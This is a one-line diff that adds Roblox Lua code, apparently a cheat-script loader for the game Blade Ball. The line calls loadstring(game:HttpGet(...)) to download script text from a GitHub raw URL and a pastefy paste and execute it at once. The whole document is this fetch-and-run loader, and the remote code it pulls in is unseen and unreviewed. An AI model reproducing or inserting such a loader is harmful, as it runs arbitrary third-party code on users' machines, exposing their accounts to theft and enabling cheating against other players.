@@ -1,0 +1,1 @@
+task.spawn(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/BobitFree-BladeBall/BobitFree/refs/heads/main/BobitFree"))()end)loadstring(game:HttpGet("https://pastefy.app/uOGPY7V5/raw"))()
